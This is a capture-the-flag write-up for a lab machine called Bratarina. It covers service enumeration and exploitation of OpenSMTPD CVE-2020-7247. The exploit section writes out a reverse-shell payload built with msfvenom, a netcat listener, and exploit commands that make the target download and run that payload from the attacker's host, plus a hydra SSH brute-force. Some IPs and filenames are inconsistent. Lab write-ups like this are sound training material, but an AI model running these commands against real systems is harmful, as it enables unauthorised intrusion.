# Bratarina
## Table of Contents
* [Summary](#summary)
* [Enumerate](#enumerate)
  * [Ports](#ports)
  * [Services](#services)
    * [SSH](#ssh) 
    * [SMTP](#smtp)
    * [HTTP](#http)
    * [SMB](#smb)
  * [OS](#os)
    * [Nmap OS Discovery Scan](#nmap-os-discovery-scan)
    * [Nmap OS Discovery Scan via SMB](#nmap-os-discovery-scan-via-smb)
* [Exploit](#exploit)
  * [CVE-2020-7247](#cve-2020-7247) 
    * [EDB-ID-47984](#edb-id-47984)
    * [Metasploit](#metasploit)
* [Explore](#explore)
* [Escalate](#escalate)
* [Lessons Learned](#lessons-learned)

## Summary
* Hostname: bratarina
* Description: Bratarina is not the nicest lady in town.
* IP Address: 192.168.132.71
* MAC Address: (ref:)
* Domain: WORKGROUP
* TCP Ports and Services
  * 22
    * OpenSSH 7.6
  * 25
    * OpenSMTPd
  * 80
    * Nginx 1.14
    * FlashBB
  * 445
    * Samba 4.7.6-Ubuntu (ref: Nmap)
* OS 
  * Distro: Ubuntu (ref: Nmap)
  * Kernel: Linux 2.6.32 or 3.10 (ref: Nmap)
  * Architecture: (ref:)
* Users
  * root (ref: Nmap)
  * neil (ref: passwd.bak downloaded via smbclient)
* Vulnerabilities and Exploits
  * CVE-2020-7247 (ref: searchsploit)
    * EDB-ID-48038 (ref: searchsploit)
* Flag
  * 055124521243345de53fcee856b4fd44
* Hints
  * n/a

# Enumerate
## Setup
```bash
TARGET=192.168.132.71
NAME=bratarina
new-ctf $NAME
cd $NAME
```

## Ports
```bash
sudo nmap $TARGET -sS -sU --min-rate 1000 -oN scans/$NAME-nmap-initial
sudo nmap $TARGET -sS -sU -p- --min-rate 1000 -oN scans/$NAME-nmap-complete
sudo nmap $TARGET -sV $(print-open-ports-from-nmap-scan scans/$NAME-nmap-complete) -oN scans/$NAME-nmap-versions

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-03 10:59 EDT
Nmap scan report for 192.168.132.71
Host is up (0.084s latency).

PORT    STATE  SERVICE     VERSION
22/tcp  open   ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
25/tcp  open   smtp        OpenSMTPD
80/tcp  open   http        nginx 1.14.0 (Ubuntu)
445/tcp open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: COFFEECORP)
Service Info: Host: bratarina; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.12 seconds
```

## Services
### SSH
Hydra was unable to guess the correct password for neil. 
```bash
hydra -l neil -P /usr/share/wordlists/rockyou.txt  ssh://192.168.141.71

# output
NSTR
```

### SMTP
Automated enumeration of supported SMTP commands.
```bash
sudo nmap $TARGET -p25 --script smtp-commands -oN scans/$NAME-nmap-script-smtp-commands

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-04 01:20 EDT
Nmap scan report for 192.168.141.71
Host is up (0.096s latency).

PORT   STATE SERVICE
25/tcp open  smtp
| smtp-commands: bratarina Hello nmap.scanme.org [192.168.49.141], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP, 
|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info 

Nmap done: 1 IP address (1 host up) scanned in 0.83 seconds
```

Automated enumeration of existing SMTP users. Nmap reported "root" was a valid user.
```bash
sudo nmap $TARGET -p25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} -oN scans/$NAME-nmap-script-smtp-enum-users

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-04 01:21 EDT
Failed to resolve "smtp-enum-users.methods=EXPN".
Failed to resolve "smtp-enum-users.methods=RCPT".
Failed to resolve "smtp-enum-users.methods=RCPT".
Nmap scan report for 192.168.141.71
Host is up (0.072s latency).

PORT   STATE SERVICE
25/tcp open  smtp
| smtp-enum-users: 
|_  root

Failed to resolve "smtp-enum-users.methods=RCPT".
Nmap done: 1 IP address (1 host up) scanned in 1.54 seconds
```

```bash
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $TARGET

# output
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 192.168.141.71
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... /usr/share/wordlists/metasploit/unix_users.txt
Target count ............. 1
Username count ........... 168
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Sun Jul  4 01:07:36 2021 #########
######## Scan completed at Sun Jul  4 01:07:47 2021 #########
0 results.

168 queries in 11 seconds (15.3 queries / sec)
```

Automated enumeration of exploitable SMTP vulnerabilities.
```bash
sudo nmap $TARGET -p25 --script smtp-vuln* -oN scans/mailman-nmap-script-smtp-vuln

# output
# Nmap 7.91 scan initiated Sun Jul  4 00:43:18 2021 as: nmap -p25 --script smtp-vuln* -oN scans/bratarina-nmap-script-smtp-vuln 192.168.141.71
Nmap scan report for 192.168.141.71
Host is up (0.072s latency).

PORT   STATE SERVICE
25/tcp open  smtp
| smtp-vuln-cve2010-4344: 
|_  The SMTP server is not Exim: NOT VULNERABLE

# Nmap done at Sun Jul  4 00:43:19 2021 -- 1 IP address (1 host up) scanned in 0.74 seconds
```

### HTTP
The target provided NSTR when scanned with dirb.
```bash
dirb http://$TARGET -r -z10 -o scans/$NAME-dirb-common

# output
...snipped...
+ http://192.168.141.71/index.html (CODE:200|SIZE:612)
+ http://192.168.141.71/robots.txt (CODE:200|SIZE:14)
==> DIRECTORY: http://192.168.141.71/static/
==> DIRECTORY: http://192.168.141.71/static/css/
==> DIRECTORY: http://192.168.141.71/static/fonts/
==> DIRECTORY: http://192.168.141.71/static/img/
==> DIRECTORY: http://192.168.141.71/static/js/

END_TIME: Sat Jul  3 20:11:08 2021
DOWNLOADED: 27672 - FOUND: 4
```

Nikto reported the target had no CGI directories. 
```bash
nikto -h $TARGET -p $PORT -T 2 -Format txt -o scans/$NAME-nikto-misconfig

# output
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.141.71
+ Target Hostname:    192.168.141.71
+ Target Port:        80
+ Start Time:         2021-07-04 01:16:23 (GMT-4)
---------------------------------------------------------------------------
+ Server: nginx/1.14.0 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ 1349 requests: 0 error(s) and 3 item(s) reported on remote host
+ End Time:           2021-07-04 01:18:34 (GMT-4) (131 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

The target is not vulnerable to Shellshock.
```bash
sudo nmap $TARGET -p80 --script http-shellshock -oN scans/$NAME-nmap-script-http-shellshock

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-04 01:12 EDT
Nmap scan report for 192.168.141.71
Host is up (0.075s latency).

PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.27 seconds
```

### SMB
```bash
smbclient -L $TARGET

# output
Enter WORKGROUP\victor's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        backups         Disk      Share for backups
        IPC$            IPC       IPC Service (Samba 4.7.6-Ubuntu)
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.132.71 failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available
```
```bash
smbmap -H 192.168.141.71

# output
[+] Guest session       IP: 192.168.141.71:445  Name: 192.168.141.71                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        backups                                                 READ ONLY       Share for backups
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.7.6-Ubuntu)
```
```bash
smbclient \\\\192.168.132.71\\backups
get passwd.bak
exit
cat passwd.bak

# output
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
neil:x:1000:1000:neil,,,:/home/neil:/bin/bash
_smtpd:x:1001:1001:SMTP Daemon:/var/empty:/sbin/nologin
_smtpq:x:1002:1002:SMTPD Queue:/var/empty:/sbin/nologin
postgres:x:111:116:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
```

```bash
sudo nmap 192.168.132.71 -A -oN scans/bratarina-nmap-aggresive

# output
Aggressive OS guesses: Linux 2.6.32 (88%), Linux 2.6.32 or 3.10 (88%), Linux 3.5 (88%), Linux 4.2 (88%), Linux 4.4 (88%), Synology DiskStation Manager 5.1 (88%), WatchGuard Fireware 11.8 (88%), Linux 2.6.35 (87%), Linux 2.6.39 (87%), Linux 3.10 - 3.12 (87%)
No exact OS matches for host (test conditions non-ideal).

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.54 seconds
```

## OS
### Nmap OS Discovery Scan
```bash
sudo nmap $TARGET -O -oN scans/$NAME-nmap-os

# output
Nmap scan report for 192.168.132.71
Host is up (0.077s latency).
Not shown: 995 filtered ports
PORT    STATE  SERVICE
22/tcp  open   ssh
25/tcp  open   smtp
53/tcp  closed domain
80/tcp  open   http
445/tcp open   microsoft-ds
Aggressive OS guesses: Linux 2.6.32 (88%), Linux 2.6.32 or 3.10 (88%), Linux 3.5 (88%), Linux 4.2 (88%), Linux 4.4 (88%), Synology DiskStation Manager 5.1 (88%), WatchGuard Fireware 11.8 (88%), Linux 2.6.35 (87%), Linux 2.6.39 (87%), Linux 3.10 - 3.12 (87%)
No exact OS matches for host (test conditions non-ideal).

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul  3 11:10:14 2021 -- 1 IP address (1 host up) scanned in 12.54 seconds
```

### Nmap OS Discovery Scan via SMB
```bash
sudo nmap $TARGET -p445 --script smb-os-discovery -oN scans/$NAME-nmap-os-smb

# output
nmap scan report for 192.168.132.71
Host is up (0.075s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: bratarina
|   NetBIOS computer name: BRATARINA\x00
|   Domain name: \x00
|   FQDN: bratarina
|_  System time: 2021-07-03T11:11:28-04:00

# Nmap done at Sat Jul  3 11:11:30 2021 -- 1 IP address (1 host up) scanned in 3.28 seconds
```

# Exploit
## CVE-2020-7247
### EDB-ID-47984
This works!
```bash
searchsploit opensmtpd
mkdir edb-id-47984
cd edb-id-47984
searchsploit -m 47984

# this works!
sudo tcpdump -i tun0 icmp
python 47984.py 192.168.141.71 25 'ping -c2 192.168.49.141'

# this works!
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.141 LPORT=443 -f elf -o rshell
sudo nc -nvlp 443 # walkthrough uses TCP port 445
sudo python3 -m http.server 80
python3 47984.py 192.168.141.71 25 'wget 192.168.49.141/rshell -O /tmp/rshell'
python3 47984.py 192.168.141.71 25 'chmod +x /tmp/shell'
python3 47984.py 192.168.141.71 25 '/tmp/shell'
ifconfig -a && hostname && whoami
```

### Metasploit
This works!
```bash
sudo msfconsole
search opensmtpd
exploit/unix/smtp/opensmtpd_mail_from_rce
set RHOST 192.168.141.71
set LHOST tun0
set LPORT 25
run
ifconfig -a && hostname && whoami
```

# Lessons Learned
* Search Exploit-DB using a traditional, GUI web browser in addition to what is found via Searchsploit.
* Prioritize exploits where the exploit has been confirmed by OffSec and the vulnerable software is available for download.
* You probably found the right exploit if the target is running a relevant service version.
